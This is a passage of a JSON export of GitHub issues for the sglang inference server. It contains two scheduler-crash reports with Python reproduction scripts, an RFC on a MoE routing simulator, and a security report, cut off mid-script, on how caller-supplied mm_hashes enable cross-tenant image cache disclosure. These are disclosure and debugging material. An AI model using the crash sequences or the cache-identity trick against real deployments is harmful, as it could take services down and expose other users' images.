urllib.error.HTTPError as e:\n        return e.code\n    except Exception as e:  # connection refused / reset: the server is gone\n        return type(e).__name__\n\n\ndef alive():\n    try:\n        with urllib.request.urlopen(BASE + \"/health\", timeout=5) as r:\n            return r.status == 200\n    except Exception:\n        return False\n\n\ndef stream_then_disconnect(chunks=3):\n    \"\"\"Start a streamed /generate, read a few chunks, then drop the connection.\"\"\"\n    conn = http.client.HTTPConnection(HOST.hostname, HOST.port, timeout=60)\n    body = {\"text\": \"Write a long story about a lighthouse keeper.\", \"stream\": True,\n            \"sampling_params\": {\"max_new_tokens\": 1024, \"temperature\": 0, \"ignore_eos\": True}}\n    conn.request(\"POST\", \"/generate\", json.dumps(body), {\"Content-Type\": \"application/json\"})\n    resp = conn.getresponse()\n    seen = 0\n    while seen < chunks:\n        line = resp.fp.readline()\n        if not line:\n            break\n        if line.startswith(b\"data:\"):\n            seen += 1\n    time.sleep(0.1)\n    conn.sock.close()          # the client disconnect\n    conn.close()\n\n\ndef main():\n    post(\"/generate\", {\"text\": \"warm up\", \"sampling_params\": {\"max_new_tokens\": 8}}, 300)\n    for i, delay in enumerate(DELAYS_MS):\n        stream_then_disconnect()\n        time.sleep(delay / 1000)\n        p = post(\"/pause_generation\", {\"mode\": \"abort\"})\n        r = post(\"/release_memory_occupation\", {}) if p == 200 else None\n        # (/health is not served while memory is released, so judge after resume + continue)\n        u = post(\"/resume_memory_occupation\", {}) if r == 200 else None\n        c = post(\"/continue_generation\", {}) if u == 200 else None\n        time.sleep(1.0)\n        up = alive()\n        print(f\"trial {i}: pause(abort) {delay} ms after the disconnect -> pause {p}, release {r}, resume {u}, \"\n              f\"continue {c}; {'alive' if up else 'SERVER DOWN'}\")\n        if not up:\n            return 1\n    print(\"not reproduced\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\nOutput, three fresh servers in a row (RTX A4000, on main):\n```\n=== run 1 ===\ntrial 0: pause(abort) 0 ms after the disconnect -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n=== run 2 ===\ntrial 0: pause(abort) 0 ms after the disconnect -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n=== run 3 ===\ntrial 0: pause(abort) 0 ms after the disconnect -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n```\n\nEach server log has the assert above.\n\nWindow, the same calls, a 1024-token stream disconnected 100 ms after its first chunk, 10 trials per row, server\nrestarted after each death:\n\n| pause(abort) sent after the disconnect | n=1 | n=2 |\n|---|---|---|\n| 0 ms | 5/10 | 8/10 |\n| 1 ms | 7/10 | 10/10 |\n| 5 ms | 0/10 | 4/10 |\n| 10 / 50 / 300 ms | 0/10 each | 0/10 each |\n| no disconnect (stream still running), release 0-100 ms after the pause | 0/50 | 0/50 |\n| no request in flight | 0/10 | |\n\nA few possible cause:\n1. A disconnect makes the tokenizer manager abort that request (`tokenizer_manager.py` ~1916-1925); the scheduler drops it from `running_batch` only on a later step.\n2. `pause_generation` with `mode=\"abort\"` never reaches the scheduler: the tokenizer manager calls `abort_request(abort_all=True)` and answers 200 (`tokenizer_manager.py` ~2206-2219). The scheduler's own `pause_generation` accepts only `in_place` / `retract` (`scheduler.py` ~5589), so `_engine_paused` stays `False`.\n3. `release_memory_occupation` asserts `is_fully_idle(ignore_waiting=scheduler._engine_paused)` (`weight_updater.py` ~339). With `_engine_paused` False and the disconnected request still in `running_batch`, the check fails and the scheduler process exits.\n\n### Environment\n\n<details>\n<summary><code>python -m sglang.check_env</code></summary>\n\n```text\nPython: 3.12.3 (main, Apr 23 2024, 14:57:18) [GCC 11.4.1 20230605 (Red Hat 11.4.1-2)]\nCUDA available: True\nGPU 0: NVIDIA RTX A4000\nGPU 0 Compute Capability: 8.6\nCUDA_HOME: <venv>/lib/python3.12/site-packages/nvidia/cu13\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 595.91.07\nPyTorch: 2.14.1+cu130\nsglang: 0.0.0.dev1+g7224fce1b\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.1\nflashinfer_cubin: Module Not Found\nflashinfer_jit_cache: Module Not Found\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.0\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.13.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0\nNVIDIA Topology: \n    GPU0    NIC0    CPU Affinity    NUMA Affinity    GPU NUMA ID\nGPU0     X     NODE    3-6    0        N/A\nNIC0    NODE     X                 \n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nNIC Legend:\n\n  NIC0: mlx5_bond_0\n\n\nulimit soft: 1024\n```\n\n</details>","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44745/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44745/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44744","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44744/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44744/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44744/events","html_url":"https://github.com/sgl-project/sglang/issues/44744","id":5884906520,"node_id":"I_kwDOLCAjRs8AAAABXsSMGA","number":44744,"title":"[Bug] `pause_generation(mode=\"retract\")` while a request's grammar is compiling, then `release_memory_occupation` with an AssertionError kills the scheduler","user":{"login":"Yunzez","id":56664264,"node_id":"MDQ6VXNlcjU2NjY0MjY0","avatar_url":"https://avatars.githubusercontent.com/u/56664264?v=4","gravatar_id":"","url":"https://api.github.com/users/Yunzez","html_url":"https://github.com/Yunzez","followers_url":"https://api.github.com/users/Yunzez/followers","following_url":"https://api.github.com/users/Yunzez/following{/other_user}","gists_url":"https://api.github.com/users/Yunzez/gists{/gist_id}","starred_url":"https://api.github.com/users/Yunzez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Yunzez/subscriptions","organizations_url":"https://api.github.com/users/Yunzez/orgs","repos_url":"https://api.github.com/users/Yunzez/repos","events_url":"https://api.github.com/users/Yunzez/events{/privacy}","received_events_url":"https://api.github.com/users/Yunzez/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-16T13:22:02Z","updated_at":"2026-10-16T13:22:02Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nOn a server started with `--enable-memory-saver`, this sequence of documented control calls kills the scheduler:\n\n1. `POST /generate` with a `json_schema` the server has not seen before (so its grammar has to compile);\n2. 5-10 ms later, `POST /pause_generation {\"mode\": \"retract\"}` -- answered `200`;\n3. `POST /release_memory_occupation {}` -- never answered; the connection is dropped and the server exits:\n\n```\n[2026-10-14 13:36:43] INFO:     127.0.0.1:57390 - \"POST /pause_generation HTTP/1.1\" 200 OK\n[2026-10-14 13:36:43] Scheduler hit an exception: Traceback (most recent call last):\n  ...\n  File \".../sglang/srt/managers/scheduler_components/weight_updater.py\", line 339, in release_memory_occupation\n    assert self.is_fully_idle(\nAssertionError: release_memory_occupation should be called only when server is idle.\n[2026-10-14 13:36:43] SIGQUIT received. signum=None, frame=None. It usually means one child failed.\n```\n\nIt does **not** happen:\n* when the request has no grammar (plain prompt, same timing: 0/10);\n* with `{\"mode\": \"abort\"}` instead of `\"retract\"` (0/10);\n* when the pause lands 0 ms after the request (0/10, the request has not reached the scheduler yet) or 20 ms or later (0/10 at 20, 50, 100 and 300 ms, the grammar has compiled by then).\n\n\n### Reproduction\n\nDo\n```bash\npython -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n    --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\npython3 repro.py http://127.0.0.1:30000      # stdlib only\n```\n\nRepro.py script below: \n```python\n#!/usr/bin/env python3\n\"\"\"Minimal client: /pause_generation {\"mode\": \"retract\"} that lands while a request's grammar is still compiling,\nfollowed by /release_memory_occupation, kills the SGLang scheduler.\n\nServer (SGLang main):\n    python -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n        --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\n\nRun:  python3 repro_issue.py http://127.0.0.1:30000      (stdlib only)\nEach trial sends a /generate with a never-seen json_schema, waits DELAY ms, pauses in retract mode, releases memory,\nand -- if the server is still up -- resumes memory and continues generation. Exit 1 when the server dies.\n\"\"\"\nimport json\nimport sys\nimport threading\nimport time\nimport urllib.error\nimport urllib.request\nimport uuid\n\nBASE = sys.argv[1] if len(sys.argv) > 1 else \"http://127.0.0.1:30000\"\nDELAYS_MS = (5, 10) * 5\n\n\ndef post(path, body, timeout=30):\n    req = urllib.request.Request(BASE + path, json.dumps(body).encode(), {\"Content-Type\": \"application/json\"})\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as r:\n            return r.status\n    except urllib.error.HTTPError as e:\n        return e.code\n    except Exception as e:  # connection refused / reset: the server is gone\n        return type(e).__name__\n\n\ndef alive():\n    try:\n        with urllib.request.urlopen(BASE + \"/health\", timeout=5) as r:\n            return r.status == 200\n    except Exception:\n        return False\n\n\ndef schema(nonce):\n    # a fresh property name every time, so the grammar is compiled, not served from the grammar cache\n    return {\"type\": \"object\",\n            \"properties\": {f\"field_{nonce}\": {\"type\": \"string\"}, f\"count_{nonce}\": {\"type\": \"integer\"},\n                           f\"items_{nonce}\": {\"type\": \"array\", \"items\": {\"type\": \"string\"}}},\n            \"required\": [f\"field_{nonce}\", f\"count_{nonce}\"]}\n\n\ndef constrained_generate():\n    body = {\"text\": \"List three facts about the moon in the required format.\",\n            \"sampling_params\": {\"max_new_tokens\": 128, \"temperature\": 0,\n                                \"json_schema\": json.dumps(schema(uuid.uuid4().hex[:12]))}}\n    threading.Thread(target=post, args=(\"/generate\", body, 120), daemon=True).start()\n\n\ndef main():\n    # warm up the sampler and the grammar backend\n    post(\"/generate\", {\"text\": \"warm up\", \"sampling_params\": {\"max_new_tokens\": 8}}, 300)\n    post(\"/generate\", {\"text\": \"warm grammar\", \"sampling_params\": {\n        \"max_new_tokens\": 8, \"temperature\": 0, \"json_schema\": json.dumps(schema(\"warmup\"))}}, 300)\n    for i, delay in enumerate(DELAYS_MS):\n        constrained_generate()\n        time.sleep(delay / 1000)\n        p = post(\"/pause_generation\", {\"mode\": \"retract\"})\n        r = post(\"/release_memory_occupation\", {}) if p == 200 else None\n        # (/health is not served while the engine is paused and released, so judge after resume + continue)\n        u = post(\"/resume_memory_occupation\", {}) if r == 200 else None\n        c = post(\"/continue_generation\", {}) if u == 200 else None\n        time.sleep(1.0)\n        up = alive()\n        print(f\"trial {i}: pause {delay} ms after the request -> pause {p}, release {r}, resume {u}, continue {c}; \"\n              f\"{'alive' if up else 'SERVER DOWN'}\")\n        if not up:\n            return 1\n    print(\"not reproduced\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\nOutput, three fresh servers in a row (RTX A6000, main 7224fce1b5):\n\n```\n=== run 1 ===\ntrial 0: pause 5 ms after the request -> pause 200, release 200, resume 200, continue 200; alive\ntrial 1: pause 10 ms after the request -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n=== run 2 ===\ntrial 0: pause 5 ms after the request -> pause 200, release 200, resume 200, continue 200; alive\ntrial 1: pause 10 ms after the request -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n=== run 3 ===\ntrial 0: pause 5 ms after the request -> pause 200, release 200, resume 200, continue 200; alive\ntrial 1: pause 10 ms after the request -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n```\n\nEach server log has the assert above. In every run the first trial after the warm-up survived and the second one\nkilled the server; we have not worked out why the first one misses.\n\nWindow, measured with the same request and calls, 10 trials per row, server restarted after each death:\n\n| pause sent after the constrained request | scheduler deaths |\n|---|---|\n| 0 ms | 0/10 |\n| 5 ms | 5/10 |\n| 10 ms | 5/10 |\n| 20 / 50 / 100 / 300 ms | 0/10 each |\n| plain prompt (no grammar), retract | 0/10 |\n| constrained, `mode=\"abort\"` | 0/10 |\n\nWith `--enable-hierarchical-cache --hicache-write-policy write_through` added, the constrained arm died 9/10 at 5 ms and 10/10 at 10 ms; the plain-prompt control stayed 0/10.\n\n\n\n### Environment\n\n<details>\n<summary><code>python -m sglang.check_env</code></summary>\n\n```text\nPython: 3.12.3 (main, Apr 23 2024, 14:57:18) [GCC 11.4.1 20230605 (Red Hat 11.4.1-2)]\nCUDA available: True\nGPU 0: NVIDIA RTX A6000\nGPU 0 Compute Capability: 8.6\nCUDA_HOME: <venv>/lib/python3.12/site-packages/nvidia/cu13\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 595.91.07\nPyTorch: 2.14.1+cu130\nsglang: 0.0.0.dev1+g7224fce1b\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.1\nflashinfer_cubin: Module Not Found\nflashinfer_jit_cache: Module Not Found\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.0\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.13.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0\nNVIDIA Topology: \n    GPU0    NIC0    NIC1    NIC2    CPU Affinity    NUMA Affinity    GPU NUMA ID\nGPU0     X     PHB    PHB    NODE    20-21    1        N/A\nNIC0    PHB     X     PIX    NODE                \nNIC1    PHB    PIX     X     NODE                \nNIC2    NODE    NODE    NODE     X                 \n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nNIC Legend:\n\n  NIC0: mlx5_2\n  NIC1: mlx5_3\n  NIC2: mlx5_bond_0\n\n\nulimit soft: 1024\n```\n\n</details>","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44744/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44744/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44697","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44697/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44697/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44697/events","html_url":"https://github.com/sgl-project/sglang/issues/44697","id":5880301759,"node_id":"I_kwDOLCAjRs8AAAABXn5Ivw","number":44697,"title":"[RFC] MoE routing simulator for prefill imbalance profiling: balanced reference and GPU-faithful replay","user":{"login":"Phoenix3334","id":174691475,"node_id":"U_kgDOCmmUkw","avatar_url":"https://avatars.githubusercontent.com/u/174691475?v=4","gravatar_id":"","url":"https://api.github.com/users/Phoenix3334","html_url":"https://github.com/Phoenix3334","followers_url":"https://api.github.com/users/Phoenix3334/followers","following_url":"https://api.github.com/users/Phoenix3334/following{/other_user}","gists_url":"https://api.github.com/users/Phoenix3334/gists{/gist_id}","starred_url":"https://api.github.com/users/Phoenix3334/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Phoenix3334/subscriptions","organizations_url":"https://api.github.com/users/Phoenix3334/orgs","repos_url":"https://api.github.com/users/Phoenix3334/repos","events_url":"https://api.github.com/users/Phoenix3334/events{/privacy}","received_events_url":"https://api.github.com/users/Phoenix3334/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-16T07:40:10Z","updated_at":"2026-10-16T07:56:41Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"## Motivation\n\nWe would like to follow up on #20307 with a narrowly scoped, opt-in profiling workflow: **compare production routing with synthetic balanced routing inside the serving pipeline, before investing in routing changes.**\n\nWhile investigating DeepSeek-V4-Pro prefill on a single 8-GPU B300 node (TP8/DP8, MegaMoE), we found that logical expert popularity, physical placement/replica dispatch, kernel block rounding, and rank arrival/request-supply gaps were being conflated. A balanced kernel microbenchmark alone cannot establish how much end-to-end performance expert imbalance costs.\n\nThis proposal does not change default routing or claim an accuracy-preserving optimization.\n\n## Existing implementations and overlap\n\n| Reference | Mechanism | Relevant lesson |\n| --- | --- | --- |\n| [TensorRT-LLM Perfect Router](https://github.com/NVIDIA/TensorRT-LLM/blob/04cefe271daceb491dbdacb0fcd8f1a174c10c16/docs/source/developer-guide/perf-analysis.md#moe-expert-load-balance-analysis-perfect-router) | Retains the learned router computation for timing, then substitutes precomputed/cached balanced logits | Measure an idealized balanced-routing reference while minimizing simulator overhead |\n| [vLLM Routing Simulator](https://github.com/vllm-project/vllm/blob/main/vllm/model_executor/layers/fused_moe/router/routing_simulator_router.py) | Generates synthetic expert IDs/weights; the inspected implementation has uniform-random and normal-distribution strategies | Useful for distribution sensitivity; uniform random is not exact per-batch balance, and runtime sampling has overhead |\n| SGLang #20307 | Comments point to `--ep-dispatch-algorithm fake`, with all-to-all / MoE-runner coverage limitations | First check whether the existing mechanism covers the target model/backend and extend it where possible |\n\n#20307 was automatically closed for inactivity; its closed state does not establish that a backend-independent simulator was implemented. TRT-LLM also documents model-specific integration and routing-method-dependent balanced-logit generation. An environment flag alone should not be assumed to cover V4-Pro/MegaMoE.\n\n## First deliverable: serving-level balanced reference\n\nStart with a manual benchmark and an implementation that reuses existing fake-dispatch/router seams where possible.\n\n1. **Verify backend coverage.** Trace the actual V4-Pro/MegaMoE path. Confirm where substitution must occur, whether it acts on logical or physical IDs, and how it interacts with group constraints and replica remapping. Keep the mode disabled by default and visibly mark outputs as invalid.\n2. **Use the same frozen real-input-ID requests for both arms.** Fix lengths, arrival policy, output length, cache, delayer, topology and engine revision. Measure request-supply gaps rather than assuming pretokenization eliminates them. A prefill-focused, fixed-output-length workload limits feedback from invalid generated text.\n3. **Define the synthetic distribution precisely.** Record expert/group constraints, top-k, routing weights, rank-local versus global balance, and whether balance is exact or statistical. Avoid duplicate expert selections within a token. Where feasible, use deterministic cached/precomputed data indexed by token/rank offsets and validate achieved per-layer counts.\n4. **Account for simulator work.** Preserve router GEMM work when practical, document any bypassed selection/normalization work, and measure replacement overhead. Include generation or memory costs in the report rather than attributing all timing changes to balance. Check compatibility with CUDA graph replay and changing valid-token counts.\n5. **Report both kernel and end-to-end changes.** Compare repeated baseline and synthetic runs; report logical/physical loads, per-rank block counts, slowest-rank MoE timing, throughput and latency. Run profiling/recording separately from timing.\n\nThe result is a **counterfactual performance reference under the specified synthetic routing**, not a guaranteed attainable speedup or a strict upper bound. Substitution changes communication patterns, later hidden states and potentially kernel behavior. Neither low count CV nor synthetic throughput proves that EPLB or bias changes can recover the same gain.\n\n## Separate follow-up: faithful replay and real candidates\n\nBalanced simulation and GPU-faithful replay answer different questions:\n\n| Mode | Purpose | Evidence limit |\n| --- | --- | --- |\n| Production routing | Establish the measured workload baseline | Includes its actual physical mapping and scheduling |\n| Synthetic balanced routing | Estimate sensitivity to an idealized load distribution | Invalid model outputs; no quality conclusion |\n| Unchanged GPU snapshot replay | Verify reproduction of production IDs/weights before sensitivity analysis | Fixed hidden states; cannot establish full-model effects |\n| Placement/replica comparison | Evaluate physical balancing while preserving logical selections/weights | Needs held-out workloads and actual replica dispatch |\n| Bias perturbation | Explore semantics-changing candidate routes | Requires full-model quality evaluation |\n\nFor replay, reuse [expert distribution recording](https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/eplb/expert_distribution.py), [routed expert capture](https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/state_capturer/routed_experts.py), and the selected production GPU gate. Capture bounded samples with layer, valid-token count, bias, scoring/group/normalization configuration, topology, backend and aggregation semantics. Do not sum already-global dumps again.\n\nOur earlier CPU top-k exploration did not reliably reproduce GPU choices near ties. Before any perturbation study, unchanged GPU replay must reproduce captured IDs and weights; report expert-set and slot-order differences separately. Snapshot replay does not establish quality preservation. Bias candidates, if pursued, need independent calibration/held-out full-model evaluation with model-author guidance.\n\n#38695 is relevant to shared gating/precision; #42188 illustrates recording/remapping coverage gaps. This proposal should reuse those efforts rather than introduce a parallel recorder or router abstraction.\n\n## Scope and feedback requested\n\nThe initial target is manual CUDA V4-Pro prefill profiling. Decode, speculative paths and multi-node coverage are follow-ups. Reuse existing tests and add only focused simulator/count/graph checks where needed; no mandatory large-model CI matrix, checkpoint mutation or automatic online bias updates.\n\n1. Does existing `fake` dispatch cover V4-Pro/MegaMoE, or what is the smallest appropriate extension?\n2. Should this extend the work discussed in #20307 and live with existing EPLB benchmarks?\n3. Is a serving-level balanced-reference comparison the preferred first contribution, with faithful replay as a separate follow-up?\n4. Which routing constraints and timing controls should be required for an interpretable comparison?\n\n## Evidence limits\n\nThis proposal is motivated by historical v0.5.17-derived experiments, not a current-main bug report or a completed implementation. Earlier text-versus-token-ID comparisons had request-path confounds, and clean held-out EPLB validation was not completed before the machine was released. A placement-only experiment with no extra replicas cannot establish EPLB's full potential. We claim neither a 13% attainable speedup, a safe bias range, nor that routing is the only remaining bottleneck.\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44697/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44697/timeline","performed_via_github_app":{"id":1144995,"client_id":"Iv23liVemv8A9if9v0F2","slug":"chatgpt-codex-connector","node_id":"A_kwHOAOQ6Gs4AEXij","owner":{"login":"openai","id":14957082,"node_id":"MDEyOk9yZ2FuaXphdGlvbjE0OTU3MDgy","avatar_url":"https://avatars.githubusercontent.com/u/14957082?v=4","gravatar_id":"","url":"https://api.github.com/users/openai","html_url":"https://github.com/openai","followers_url":"https://api.github.com/users/openai/followers","following_url":"https://api.github.com/users/openai/following{/other_user}","gists_url":"https://api.github.com/users/openai/gists{/gist_id}","starred_url":"https://api.github.com/users/openai/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/openai/subscriptions","organizations_url":"https://api.github.com/users/openai/orgs","repos_url":"https://api.github.com/users/openai/repos","events_url":"https://api.github.com/users/openai/events{/privacy}","received_events_url":"https://api.github.com/users/openai/received_events","type":"Organization","user_view_type":"public","site_admin":false},"name":"ChatGPT Codex Connector","description":"Bring ChatGPT and Codex to your GitHub repositories.","external_url":"https://www.chatgpt.com","html_url":"https://github.com/apps/chatgpt-codex-connector","created_at":"2025-02-14T01:37:05Z","updated_at":"2026-09-23T18:52:59Z","permissions":{"actions":"write","checks":"read","contents":"write","emails":"read","issues":"write","metadata":"read","pull_requests":"write","statuses":"read","workflows":"write"},"events":["check_run","check_suite","commit_comment","issues","issue_comment","pull_request","pull_request_review","pull_request_review_comment","pull_request_review_thread","repository","status","sub_issues"]},"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44641","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44641/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44641/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44641/events","html_url":"https://github.com/sgl-project/sglang/issues/44641","id":5877654374,"node_id":"I_kwDOLCAjRs8AAAABXlXjZg","number":44641,"title":"[Bug] Client-declared mm_hashes controls multimodal prefix-cache identity: wrong-image KV reuse and cross-tenant image disclosure","user":{"login":"yyymk","id":133664083,"node_id":"U_kgDOB_eNUw","avatar_url":"https://avatars.githubusercontent.com/u/133664083?v=4","gravatar_id":"","url":"https://api.github.com/users/yyymk","html_url":"https://github.com/yyymk","followers_url":"https://api.github.com/users/yyymk/followers","following_url":"https://api.github.com/users/yyymk/following{/other_user}","gists_url":"https://api.github.com/users/yyymk/gists{/gist_id}","starred_url":"https://api.github.com/users/yyymk/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/yyymk/subscriptions","organizations_url":"https://api.github.com/users/yyymk/orgs","repos_url":"https://api.github.com/users/yyymk/repos","events_url":"https://api.github.com/users/yyymk/events{/privacy}","received_events_url":"https://api.github.com/users/yyymk/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":2,"created_at":"2026-10-16T03:12:08Z","updated_at":"2026-10-16T03:42:13Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nOn multimodal deployments, the native `/generate` endpoint accepts a `mm_hashes` field: one hex string per image item, declared by the caller. In `tokenizer_manager.py` the caller value is applied directly to the item (`item.set_hash(int(hex_hash, 16))`), which short-circuits the internal content-based `hash_feature()` recompute. The comment there explains the intent: let an external KV router's routing decision agree with sglang's prefix-cache key for the same image.\n\nIn `schedule_batch.py`, `MultimodalDataItem.hash` determines the item's `pad_value`, and the image region of the token sequence is that pad value repeated. So the declared hash is the prefix-cache identity of the image segment: two requests whose items carry the same `mm_hashes` value produce matching token sequences for the image region, and the second request hits the first one's cached KV regardless of the actual image bytes.\n\nThe observable bug: a request that sends image B but declares a hash that was previously used for image A gets A's cached KV, and the model answers based on A. B's actual pixels are ignored. The response is a normal completion — no warning, no error, `finish_reason` is a regular stop. In our runs the third request below returned the first image's text with `cached_tokens` jumping from 15 to 193 (the 162-token image region served from cache), and completed faster than the uncached baselines.\n\nTwo notes on scope: the field has no flag gating or allowlist, and the OpenAI-compatible endpoints do not expose it, so this is native `/generate` only. Also, the Kimi embedding path already treats this as something to prevent — it rejects caller `mm_hashes` from redirecting cache identity (PR #34411) — while the generic path applies the caller value unconditionally.\n\n### Reproduction\n\nTested with Qwen2.5-VL-3B-Instruct. Prepare two same-size images (512x256): image A, white background with black text `IMAGE-A-SECRET-7f3a9c`; image B, black background with white text `IMAGE-B-DISTRACT-2c1b4d`. The prompt text must be byte-identical across the three calls and must place the vision placeholder inside the model's chat template (`<|vision_start|><|image_pad|><|vision_end|>` for Qwen2.5-VL).\n\n```python\nimport base64, requests\n\ndef gen(path, mm_hash):\n    img = base64.b64encode(open(path, \"rb\").read()).decode()\n    r = requests.post(\"http://<host>:8200/generate\", json={\n        \"text\": \"<|im_start|>user\\n<|vision_start|><|image_pad|><|vision_end|>\\n\"\n                \"describe the image and transcribe all text in it<|im_end|>\\n\"\n                \"<|im_start|>assistant\\n\",\n        \"image_data\": [img],\n        \"mm_hashes\": [mm_hash],\n        \"sampling_params\": {\"max_new_tokens\": 64, \"temperature\": 0},\n    }, timeout=60)\n    j = r.json()\n    return 